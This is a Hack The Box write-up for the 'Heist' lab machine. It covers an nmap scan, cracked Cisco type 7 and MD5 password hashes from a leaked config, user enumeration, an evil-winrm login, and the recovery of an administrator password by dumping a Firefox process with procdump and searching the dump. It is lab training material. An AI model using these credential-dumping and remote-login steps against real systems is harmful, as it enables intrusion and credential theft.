@@ -1,0 +1,138 @@
+Heist Hack the Box
+points - 20 
+difficulty - easy
+
+IP - 10.10.10.149
+
+Like always we get going by scanning the box and seeing what is running
+on each port. We see smb and other related ports for Windows RPC and we
+also see a web port listening on port 80. Starting with that we head there
+to see what is going on.
+
+Nmap scan report for 10.10.10.149
+Host is up (0.26s latency).
+Not shown: 65531 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Support Login Page
+|_Requested resource was login.php
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49668/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 1m57s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-02-13T16:26:21
+|_  start_date: N/A
+
+When first landing on the web port 80 we see a login page. Without spending much
+time as seen in the bottom right corner to login as guest so that just got us in the
+web app. Here on http://10.10.10.149/issues.php we can see one of the comments from
+Hazard has an attachment so we click on that.
+
+Found this file after logging in as the guest from the attachment on the page from 
+Hazard. We can see different sets of hashes so we begin to crack each one with 2 of
+the passwords being different than a normal Cisco password. It is an older type 7
+password hash. This is no longer the standard and is not recommended to override the
+default hashing scheme of Cisco.
+
+Looking at - http://10.10.10.149/attachments/config.txt
+
+-----------------------------------------------------------------------------------------------------------
+
+version 12.2
+no service pad
+service password-encryption
+!
+isdn switch-type basic-5ess
+!
+hostname ios-1
+!
+security passwords min-length 12
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 - stealth1agent
+!
+username rout3r password 7 0242114B0E143F015F5D1E161713 - $uperP@ssword
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 - Q4)sJu\Y8qz*A3?d 
+
+-----------------------------------------------------------------------------------------------------------
+
+These can be broken using https://www.ifm.net.nz/cookbooks/passwordcracker.html for the cisco 7 passwords
+which was funny to see them again as when I first got on Cisco it was still viable to use it. 
+
+After that we use impacket or tool of choice to scan for SID's from Windows and this is the user list
+we come up with to place in our user.txt file. 
+
+Users-
+
+500: SUPPORTDESK\Administrator (SidTypeUser)
+501: SUPPORTDESK\Guest (SidTypeUser)
+503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+513: SUPPORTDESK\None (SidTypeGroup)
+1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)
+
+A while ago I altered evil-winrm.rb to cycle thru users and passes from our collected intel now.
+After scanning thru we landed on Chase as our user.  
+
+bash~# ruby evil-winrm.rb -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d' -s /usr/opt -e /usr/opt
+
+Logged in and got user.txt now off to root flag we go.
+
+*Evil-WinRM* PS C:\Users\Chase\Desktop> more user.txt
+a127daef77ab6d9*************
+
+As you can see in the login.php file in C:\inetpub\wwwwroot\there is a hash and I am sure many failed to crack it as this password was very complex. So we now scrape around looking for a way to privlage esc
+and start eumerating more.
+
+Next by running ps we can see that there is a odd process on a server firefox so with a 
+one liner we can use procdump.exe to extract some intel from it see what is in there.  
+
+Then load procdump.exe
+
+Commands to extract after loading procdump can do this from evil-winrm or get a meterpreter shell
+and load procdump from there either way will work. 
+
+Then from here for example - 
+
+*Evil-WinRM* PS C:\Users\Chase\Desktop> procdump.exe -ma -accepteula 6264
+
+The number is the PID running and you will see it output a dmp file for us to dig in and see if anything we can find from firefox process. Next run a simple command to extract the kind of content we are looking for like password or login. 
+
+*Evil-WinRM* PS C:\Users\Chase\Desktop> get-content .*.dmp | select-string -pattern 'login'
+
+This was in our dump file after running and more ofcouse just picked out the relevant line 
+to demostrate.
+
+localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+
+Now we should have our username and pass for root flag. We then login
+
+administrator
+4dD!5}x/re8]FBuZ
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
+50dfa3c6bfd20e************
+
+There we have it root flag and off we go....
+
+
+#HAckTh3Plan3t
+#NiteR1d3r
